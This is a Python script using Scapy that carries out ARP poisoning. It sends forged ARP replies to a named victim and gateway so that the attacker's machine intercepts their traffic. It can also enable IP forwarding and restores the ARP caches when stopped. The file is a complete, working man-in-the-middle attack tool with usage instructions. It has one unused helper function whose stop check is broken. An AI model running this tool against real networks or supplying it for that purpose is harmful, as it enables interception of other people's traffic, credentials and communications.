#!/usr/bin/env python3
"""
arp_spoof.py - Simple ARP poisoning tool (Scapy)
Usage:
  sudo ./arp_spoof.py --victim 10.10.10.3 --gateway 10.10.10.1 -i eth1 --enable-forwarding -v
Features:
 - poison victim <-> gateway ARP to place attacker in the middle
 - optional enable/disable IP forwarding on attacker
 - graceful restore on SIGINT
 - verbose mode
"""
import argparse
import sys
import time
import signal
from scapy.all import ARP, Ether, send, srp, conf, get_if_hwaddr

def set_ip_forward(enable: bool):
    val = "1" if enable else "0"
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(val + "\n")
    except Exception as e:
        print(f"[!] Could not set ip_forward={val}: {e}")

def get_mac(ip, iface, timeout=2):
    # send a broadcast ARP to resolve MAC
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=timeout, retry=2, iface=iface, verbose=0)
    for _, r in ans:
        return r[Ether].src
    return None

def poison_loop(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, interval, stop_event, verbose=False):
    # craft ARP replies telling victim that gateway_ip is at attacker_mac
    arp_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac, hwsrc=attacker_mac)
    # craft ARP replies telling gateway that victim_ip is at attacker_mac
    arp_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac, hwsrc=attacker_mac)
    if verbose:
        print("[*] Poisoning loop started")
    while not stop_event:
        send(arp_to_victim, iface=iface, verbose=0)
        send(arp_to_gateway, iface=iface, verbose=0)
        if verbose:
            print(f"[>] Sent spoofed ARP to {victim_ip} and {gateway_ip}")
        time.sleep(interval)

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, verbose=False):
    # send correct ARP mapping several times to fix caches
    if verbose:
        print("[*] Restoring ARP tables...")
    pkt_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac)
    pkt_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac)
    for i in range(5):
        send(pkt_victim, iface=iface, verbose=0)
        send(pkt_gateway, iface=iface, verbose=0)
        time.sleep(1)
    if verbose:
        print("[*] ARP restore packets sent")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--victim", required=True, help="Victim IP (e.g. 10.10.10.3)")
    parser.add_argument("--gateway", required=True, help="Gateway IP (e.g. 10.10.10.1)")
    parser.add_argument("-i","--iface", required=True, help="Interface to send packets on (e.g. eth1)")
    parser.add_argument("--interval", type=float, default=2.0, help="Seconds between ARP replies")
    parser.add_argument("--enable-forwarding", action="store_true", help="Enable IP forwarding while spoofing")
    parser.add_argument("-v","--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    conf.verb = 0
    attacker_mac = get_if_hwaddr(args.iface)
    if args.verbose:
        print(f"[*] Attacker MAC on {args.iface}: {attacker_mac}")

    # resolve victim and gateway MACs
    print("[*] Resolving target MAC addresses (this may take a few seconds)...")
    victim_mac = get_mac(args.victim, args.iface)
    gateway_mac = get_mac(args.gateway, args.iface)
    if not victim_mac or not gateway_mac:
        print("[!] Could not resolve MAC for victim or gateway. Ensure they are online and reachable.")
        sys.exit(1)
    print(f"[*] Victim {args.victim} is at {victim_mac}")
    print(f"[*] Gateway {args.gateway} is at {gateway_mac}")

    if args.enable_forwarding:
        print("[*] Enabling IP forwarding on attacker")
        set_ip_forward(True)

    stop_flag = False
    def sigint_handler(sig, frame):
        nonlocal stop_flag
        print("\n[!] SIGINT received — stopping and restoring ARP...")
        stop_flag = True

    signal.signal(signal.SIGINT, sigint_handler)

    try:
        # main poisoning loop
        while not stop_flag:
            # send poisoning pair
            send(ARP(op=2, pdst=args.victim, psrc=args.gateway, hwdst=victim_mac, hwsrc=attacker_mac), iface=args.iface, verbose=0)
            send(ARP(op=2, pdst=args.gateway, psrc=args.victim, hwdst=gateway_mac, hwsrc=attacker_mac), iface=args.iface, verbose=0)
            if args.verbose:
                print(f"[>] Sent spoof to {args.victim} & {args.gateway}")
            time.sleep(args.interval)
    except Exception as e:
        print(f"[!] Exception: {e}")
    finally:
        # attempt restore
        restore_arp(args.victim, victim_mac, args.gateway, gateway_mac, args.iface, args.verbose)
        if args.enable_forwarding:
            set_ip_forward(False)
        print("[*] Finished. Exiting.")

if __name__ == "__main__":
    main()
